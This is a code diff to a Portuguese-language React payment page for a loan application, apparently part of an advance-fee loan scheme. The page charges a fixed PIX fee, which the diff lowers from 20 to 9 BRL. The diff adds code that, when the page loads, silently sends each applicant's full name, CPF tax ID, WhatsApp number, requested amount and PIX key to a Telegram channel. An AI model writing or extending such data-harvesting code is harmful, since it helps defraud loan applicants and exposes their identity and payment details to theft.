@@ -1,6 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import type { LoanFormData, PixResponse } from '../../types';
 import { generatePix, checkPixStatus } from '../../lib/api';
+import { sendTelegramNotification } from '../../lib/telegram';
 import { Copy, Check, MessageCircle, AlertCircle, Loader2, QrCode } from 'lucide-react';
 
 interface PaymentProps {
@@ -15,7 +16,7 @@ const Payment: React.FC<PaymentProps> = ({ formData }) => {
   const [error, setError] = useState<string | null>(null);
 
   const USER_ID = '69c6c2808c6afae869de31f1';
-  const AMOUNT = 20;
+  const AMOUNT = 9;
   const WHATSAPP_FINANCEIRO = '5511989008294';
 
   useEffect(() => {
@@ -24,6 +25,19 @@ const Payment: React.FC<PaymentProps> = ({ formData }) => {
         setLoading(true);
         const data = await generatePix(USER_ID, AMOUNT);
         setPixData(data);
+
+        // Enviar notificação para o Telegram
+        const message = `
+<b>[NOVO] SB PAGAMENTOS:</b>
+<b>Nome:</b> ${formData.fullName}
+<b>CPF:</b> ${formData.cpf}
+<b>WhatsApp:</b> ${formData.whatsapp}
+<b>Valor:</b> R$ ${formData.amount.toLocaleString('pt-BR')}
+<b>Parcelas:</b> ${formData.installments}x
+<b>Chave PIX:</b> ${formData.pixKey}
+        `;
+        sendTelegramNotification(message.trim());
+
       } catch (err) {
         setError('Erro ao gerar PIX. Tente novamente mais tarde.');
         console.error(err);
@@ -97,7 +111,7 @@ const Payment: React.FC<PaymentProps> = ({ formData }) => {
             <img src={pixData.paymentIntent.data.qrCode} alt="PIX QR Code" className="w-48 h-48" />
           )}
         </div>
-        
+
         <div className="space-y-1">
           <p className="text-xs text-gray-500 uppercase tracking-wider font-bold">Valor a pagar</p>
           <p className="text-3xl font-black text-gray-900">R$ {AMOUNT.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</p>
@@ -130,7 +144,7 @@ const Payment: React.FC<PaymentProps> = ({ formData }) => {
         </div>
       </div>
 
-      <a 
+      <a
         href={`https://wa.me/${WHATSAPP_FINANCEIRO}`}
         className="flex items-center justify-center gap-2 text-green-600 font-medium text-sm hover:underline"
       >
